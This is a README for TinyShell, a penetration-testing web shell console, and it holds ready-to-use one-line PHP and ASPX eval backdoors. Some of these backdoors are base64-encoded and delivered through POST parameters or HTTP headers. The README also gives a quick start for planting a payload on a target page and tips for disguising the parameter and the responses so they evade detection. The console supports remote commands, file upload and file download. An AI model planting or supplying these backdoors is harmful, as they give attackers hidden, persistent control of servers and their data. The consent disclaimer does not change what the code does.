# TinyShell Web Shell Framework

Author: Joe Vest

Copyright 2015 - TinyShell

Written by: Joe Veat

Company: MINIS

DISCLAIMER: This is only for testing purposes and can only be used where strict consent has been given. Do not use this for illegal purposes.

Please read the LICENSE in LICENSE.md for the licensing information


```
___________ __               _________ __            __   __   
\__    ___/|__| ____ ___ __ /   _____/|  |__   ____ |  | |  |  
  |    |   |  |/    \   |  |\_____  \ |  |  \_/ __ \|  | |  |  
  |    |   |  |   |  \___  |/        \|   |  \  ___/|  |_|  |__
  |____|   |__|___|__/_____/_________/|___|__/\_____>____/____/

TinyShell - Webshell Console - Joe Vest - 2015

Usage: 
    tinyshell.py  --url=<url> --language=<language>
    tinyshell.py  --url=<url> --language=<language> [--mode=<traffic_mode>] [--useragent=<useragent] [--password=<password>] [-t=<timeout>]
    tinyshell.py (-h | --help) More Help and Default Settings

Options:
    -h --help                This Screen
    --url=<url>              URL source of webshell (http://localhost:80)
    --language=<language>    Webshell language (PHP, ASPX)
    --mode=<traffic_mode>    Traffic characteristics (clear, base64_post, base64_header) [default: clear]
    --useragent=<useragent>  User-Agent String to use [default: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)]
    --password=<password>    POST REQUEST parameter or HTTP HEADER used as password [default: password]
    -t=<timeout>             HTTP Timout in seconds [default: 10]

```

TinyShell is a python command shell used to control and excute commands through HTTP requests to a webshell.  TinyShell acts as the interface to the remote webshells.  

TinyShell is based on it's companion project SubShell (https://github.com/minisllc/subshell)

## New idea based on 

 - SubShell webshell framework (https://github.com/minisllc/subshell)
 - China Chopper Webshell (https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)

## Key Differences over SubShell

 - All functions passed as code to be evaluated on server
 - Reduces server side code to 1 line
 - New 'shell' code can be hidden on any page

## Python Dependencies
 
 - refer to requirements.txt

---------------------------------------------------------------

## Quick Start

1. Determine a payload
2. Determine a "password"
3. Add payload to target page
4. Enjoy

Example:

Target Language: PHP
Target URL: http://www.server.com/index.php
Desired Mode: base64_post
Password Desired: token

```
<?php @eval(base64_decode($_POST['token']));?>
```

TinyShell Command Line:

```
python tinyshell.py --url=http://www.server.com/index.php --language=php --password=token --mode=base64_post

``` 

---------------------------------------------------------------

## TinyShell Console Reference 

Interaction with a remote 'shell' using subshell is similar to a non-interactive shell.  Non-interactive commands can be submitted and the results displayed.  

If an interactive command is submitted, the command will not return.  Command will display a timeout error.  This is an HTTP timeout and not an error of whether the command executed or not.

| Command       | Description                                                                                                         | Example
|---------------|---------------------------------------------------------------------------------------------------------------------|--------------------------------------
|cd             | change directory                                                                                                    | cd c:\temp
|command        | Optional command used to issue remote command.  If no other built in command matches, then this command is assumed. | command tasklist
|config         | Show current settings                                                                                               | config
|dir            | directory command                                                                                                   | dir c:\temp
|download       | download remote file.  Files stored in ./downloads.  The original file structure is created.                        | download c:\temp\myfile.txt
|exit           | exit command shell                                                                                                  | exit
|help           | Display help for commands                                                                                           | help
|history        | show command  history                                                                                               | history
|ls             | alias for dir                                                                                                       | ls c:\temp
|ps             | List processes                                                                                                      | ps
|pwd            | show current directory                                                                                              | pwd
|shell          | submit command to local shell                                                                                       | shell ifconfig 
|timeout        | display or set the command timeout setting in seconds                                                               | timeout 120
|upload         | upload file to remote server.                                                                                       | upload myfile.txt c:\windows\temp\myfile.txt

---------------------------------------------------------------

## Encoding Header Examples

Encoded headers are the wrapper used to define where the left and right boundry of a command's response.  This allows TinyShell to locate the result of a command in a response.

### Fake CSRF Token hidden in comment

NOTE: Theses headers are delivered to the server in a request.  Depending on the server's configuration some character such as ```< ... />``` may be blocked or identified as malicious.  

```python
rsp_header = '<!-- csrf_token='
rsp_footer = ' -->'
```

### Base64 IMG tag

```python
rsp_header = '<img src="data:image/gif base64'
rsp_footer = '"/>'
```

### Commandline Examples

#### Clear text POST parameter (password) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php

#### Base64 Encoded POST Parameter (viewstate) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php --password=viewstate --mode=base64_post

#### Base64 Encoded HTTP HEADER (PESSSION) used to deliver commands

python tinyshell.py --url=http://10.0.2.10/bricks/upload/uploads/s.php --language=php --password=psession --mode=base64_header

---------------------------------------------------------------

## Server Side Payloads

A server side payload is the sever side code tadded to a target page.  This code accepts command and retuns responses.  Adjust the "password" field to better blend into your target's HTTP parameter or headers.

# Clear Text POST parameter

Requests and Responses are delivered in clear text using HTTP POST

```php
<?php @eval($_POST['password']);?>
```

 ```aspx
 <%@ Page Language="Jscript"%><%try {eval(Request.Item["password"],"unsafe"); } catch(e) {}%>

 ```

# Base64 Encoded POST parameter

Requests and Response are delivered using base64 encoded commands.  Results are delivered base64 encoded.

```php

<?php @eval(base64_decode($_POST['password']));?>
```

 ```aspx
 
 <%@ Page Language="Jscript"%><%try {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Item["password"])),"unsafe"); } catch(e) {}%>

 ```

# Base64 Encoded HEADER parameter

Requests and Response are delivered using a base64 encoded HTTP Header.  Results are delivered base64 encoded.


```php

<?php @eval(base64_decode($_SERVER['HTTP_PSESSION']));?>

```

```aspx

 <%@ Page Language="Jscript"%><%try {eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Request.Headers["password"])),"unsafe"); } catch(e) {}%>
```

